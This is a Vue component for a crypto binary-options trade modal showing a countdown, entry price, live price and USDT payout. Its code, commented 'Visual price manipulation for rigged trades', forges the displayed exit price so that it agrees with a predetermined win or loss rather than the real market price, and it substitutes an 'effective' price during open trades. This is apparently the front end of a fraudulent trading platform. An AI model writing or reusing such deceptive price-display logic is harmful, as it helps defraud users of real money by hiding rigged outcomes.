<script setup>
import { ref, computed, onMounted, onUnmounted, watch } from 'vue';
import { useMarketStore } from '../stores/market';
import { useWalletStore } from '../stores/wallet';

const props = defineProps({
    position: { type: Object, required: true }
});

const emit = defineEmits(['close']);

const marketStore = useMarketStore();
const walletStore = useWalletStore();
const now = ref(Date.now());
let animationFrameId = null;

const updateTime = () => {
    now.value = Date.now();
    animationFrameId = requestAnimationFrame(updateTime);
};

onMounted(() => {
    animationFrameId = requestAnimationFrame(updateTime);
});

onUnmounted(() => {
    if (animationFrameId) cancelAnimationFrame(animationFrameId);
});

// Auto-close when position resolves
watch(() => props.position.status, (newStatus) => {
    if (newStatus === 'WIN' || newStatus === 'LOSS') {
        // Removed auto-close: User must manually close the modal
        // setTimeout(() => emit('close'), 2500);
    }
});

// Also auto-close if time runs out and position resolves
watch(now, () => {
        // Removed auto-close: User must manually close the modal
        // setTimeout(() => emit('close'), 2500);
});

// Countdown
const remaining = computed(() => {
    const diff = props.position.endTime - now.value;
    return Math.max(0, diff);
});

const remainingSeconds = computed(() => Math.ceil(remaining.value / 1000));

const isFinished = computed(() => remaining.value <= 0);

const progress = computed(() => {
    const total = props.position.duration * 1000;
    const elapsed = now.value - props.position.startTime;
    return Math.min(1, Math.max(0, elapsed / total));
});

// Circle animation
const circleRadius = 54;
const circumference = 2 * Math.PI * circleRadius;
const dashOffset = computed(() => circumference * (1 - progress.value));

// Format helpers
const openTime = computed(() => {
    const d = new Date(props.position.startTime);
    return d.toLocaleString('en-US', {
        month: 'short', day: 'numeric', year: 'numeric',
        hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false
    });
});

const formatUSDT = (val) => {
    return val.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' USDT';
};

const settled = computed(() => props.position.status === 'WIN' || props.position.status === 'LOSS');
const settling = computed(() => props.position.status === 'SETTLING');
const isWin = computed(() => props.position.status === 'WIN');

const lockedPrice = ref(null);

watch(() => isFinished.value || settling.value, (shouldLock) => {
    if (shouldLock && lockedPrice.value === null) {
        // Snapshot the exact price at the moment the timer hits 0
        lockedPrice.value = walletStore.getEffectivePrice(props.position, marketStore.currentPrice);
    }
});

// --- Visual price manipulation for rigged trades ---
const displayPrice = computed(() => {
    const realPrice = marketStore.currentPrice;

    // If trade is settled, we forcefully show a price that matches the final win/loss status
    if (settled.value) {
        const entry = props.position.entryPrice;
        if (isWin.value) {
            // Must show winning price (use locked if it was winning, else forge one)
            if (lockedPrice.value) {
                const isCurrentlyWin = props.position.type === 'UP' ? lockedPrice.value > entry : lockedPrice.value < entry;
                if (isCurrentlyWin) return lockedPrice.value;
            }
            return props.position.type === 'UP' ? entry * 1.002 : entry * 0.998;
        } else {
            // Must show losing price (use locked if it was losing, else forge one)
            if (lockedPrice.value) {
                const isCurrentlyWin = props.position.type === 'UP' ? lockedPrice.value > entry : lockedPrice.value < entry;
                if (!isCurrentlyWin) return lockedPrice.value;
            }
            return props.position.type === 'UP' ? entry * 0.998 : entry * 1.002;
        }
    }

    // If settling (timer at 0 but backend hasn't responded yet), or timer just finished
    if (lockedPrice.value !== null) {
        return lockedPrice.value;
    }

    // While OPEN, use the shared walletStore effective price logic for continuity
    return walletStore.getEffectivePrice(props.position, realPrice);
});

const isCurrentlyWinning = computed(() => {
    if (props.position.type === 'UP') return displayPrice.value > props.position.entryPrice;
    return displayPrice.value < props.position.entryPrice;
});

const priceDiff = computed(() => {
    return displayPrice.value - props.position.entryPrice;
});

const priceDiffPercent = computed(() => {
    if (props.position.entryPrice === 0) return 0;
    return ((displayPrice.value - props.position.entryPrice) / props.position.entryPrice * 100);
});

const potentialPayout = computed(() => {
    return props.position.amount * (1 + (props.position.percentage || 80) / 100);
});

function handleClose() {
    emit('close');
}
</script>

<template>
    <Teleport to="body">
        <div class="fixed inset-0 z-[9998] flex items-center justify-center p-4"
            style="background-color: rgba(0,0,0,0.7); backdrop-filter: blur(8px);">

            <div class="w-full max-w-sm bg-gray-900 border border-gray-700 rounded-2xl shadow-2xl overflow-hidden">

                <!-- Header -->
                <div class="px-4 pt-4 pb-3 border-b border-gray-800 flex items-center justify-between">
                    <div class="flex items-center gap-2">
                        <span class="w-2 h-2 rounded-full animate-pulse"
                            :class="settled ? (isWin ? 'bg-green-500' : 'bg-red-500') : settling ? 'bg-orange-500' : 'bg-yellow-500'"></span>
                        <span class="text-sm font-bold text-white">
                            {{ settled ? (isWin ? '🎉 TRADE WON!' : '💔 TRADE LOST') : settling ? 'Settling...' : 'Active Trade' }}
                        </span>
                    </div>
                    <div class="flex items-center gap-2">
                        <span class="text-[10px] font-mono px-2 py-0.5 rounded-full font-bold"
                            :class="position.type === 'UP' ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'">
                            {{ position.type === 'UP' ? '📈 CALL' : '📉 PUT' }}
                        </span>
                        <!-- Close button (always visible) -->
                        <button @click="handleClose"
                            class="w-7 h-7 flex items-center justify-center rounded-lg text-gray-500 hover:text-white hover:bg-gray-700 transition-colors"
                            title="Close">
                            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2"
                                stroke="currentColor" class="w-4 h-4">
                                <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" />
                            </svg>
                        </button>
                    </div>
                </div>

                <!-- Countdown Circle -->
                <div class="flex flex-col items-center py-6" v-if="!settled && !settling">
                    <div class="relative w-32 h-32">
                        <svg class="w-full h-full -rotate-90" viewBox="0 0 120 120">
                            <!-- Background ring -->
                            <circle cx="60" cy="60" :r="circleRadius" fill="none" stroke="#1f2937" stroke-width="6" />
                            <!-- Progress ring -->
                            <circle cx="60" cy="60" :r="circleRadius" fill="none"
                                :stroke="isFinished ? '#f59e0b' : isCurrentlyWinning ? '#22c55e' : '#ef4444'"
                                stroke-width="6" stroke-linecap="round" :stroke-dasharray="circumference"
                                :stroke-dashoffset="dashOffset"
                                style="transition: stroke-dashoffset 0.1s linear, stroke 0.3s ease;" />
                        </svg>
                        <div class="absolute inset-0 flex flex-col items-center justify-center">
                            <span v-if="!settling" class="text-3xl font-extrabold font-mono text-white">{{
                                remainingSeconds }}</span>
                            <span v-else class="text-lg font-bold text-orange-400 animate-pulse">Settling...</span>
                            <span v-if="!settling"
                                class="text-[10px] text-gray-500 uppercase tracking-widest">seconds</span>
                        </div>
                    </div>
                </div>

                    <!-- Result Display -->
                    <div class="flex flex-col items-center py-6" v-else-if="settled">
                        <div class="w-20 h-20 rounded-full flex items-center justify-center text-4xl mb-3"
                            :class="isWin ? 'bg-green-500/20' : 'bg-red-500/20'">
                            {{ isWin ? '✅' : '❌' }}
                        </div>
                        <p class="text-lg font-bold" :class="isWin ? 'text-green-400' : 'text-red-400'">
                            {{ isWin ? `+${formatUSDT(position.amount * (position.percentage / 100))}` :
                            `-${formatUSDT(position.amount * (position.percentage / 100))}` }}
                        </p>
                        <p class="text-[10px] text-gray-500 mt-1">Tap ✕ to close</p>
                    </div>

                    <!-- Settling Display -->
                    <div class="flex flex-col items-center py-6" v-else>
                        <div class="w-20 h-20 rounded-full flex items-center justify-center text-3xl mb-3 bg-orange-500/20 text-orange-400">
                            <span class="animate-spin">⏳</span>
                        </div>
                        <p class="text-lg font-bold text-orange-400 animate-pulse">
                            Checking Result...
                        </p>
                        <p class="text-[10px] text-gray-500 mt-1">Awaiting server validation</p>
                    </div>

                <!-- Trade Details -->
                <div class="px-4 pb-3">
                    <div class="bg-gray-800/60 rounded-xl p-3 space-y-2.5 text-xs">
                        <!-- Pair -->
                        <div class="flex justify-between items-center">
                            <span class="text-gray-500">Pair</span>
                            <span class="font-bold text-white">{{ position.pair }}</span>
                        </div>
                        <!-- Amount -->
                        <div class="flex justify-between items-center">
                            <span class="text-gray-500">Trade Amount</span>
                            <span class="font-bold text-white font-mono">{{ formatUSDT(position.amount) }}</span>
                        </div>
                        <!-- Potential Payout -->
                        <div class="flex justify-between items-center" v-if="!settled">
                            <span class="text-gray-500">Payout ({{ position.percentage }}%)</span>
                            <span class="font-bold text-green-400 font-mono">{{ formatUSDT(potentialPayout) }}</span>
                        </div>
                        <!-- Open Time -->
                        <div class="flex justify-between items-center">
                            <span class="text-gray-500">Opened</span>
                            <span class="font-mono text-gray-300">{{ openTime }}</span>
                        </div>

                        <div class="border-t border-gray-700 pt-2.5 space-y-2.5">
                            <!-- Entry Price -->
                            <div class="flex justify-between items-center">
                                <span class="text-gray-500">Entry Price</span>
                                <span class="font-bold font-mono text-white">{{ formatUSDT(position.entryPrice)
                                    }}</span>
                            </div>
                            <!-- Live Price -->
                            <div class="flex justify-between items-center">
                                <span class="text-gray-500">{{ settled ? 'Exit Price' : settling ? 'Locking Price...' : 'Live Price' }}</span>
                                <span class="font-bold font-mono text-lg"
                                    :class="settled ? (isWin ? 'text-green-400' : 'text-red-400') : (isCurrentlyWinning ? 'text-green-400' : 'text-red-400')">
                                    {{ formatUSDT(displayPrice) }}
                                </span>
                            </div>
                            <!-- Price Change -->
                            <div class="flex justify-between items-center" v-if="!settled">
                                <span class="text-gray-500">Change</span>
                                <span class="font-mono font-bold"
                                    :class="priceDiff >= 0 ? 'text-green-400' : 'text-red-400'">
                                    {{ priceDiff >= 0 ? '+' : '' }}{{ formatUSDT(priceDiff) }}
                                    ({{ priceDiffPercent >= 0 ? '+' : '' }}{{ priceDiffPercent.toFixed(3) }}%)
                                </span>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Footer - dismiss hint -->
                <div class="px-4 pb-4" v-if="!settled">
                    <p class="text-[10px] text-gray-600 text-center">Tap ✕ to dismiss</p>
                </div>
            </div>
        </div>
    </Teleport>
</template>
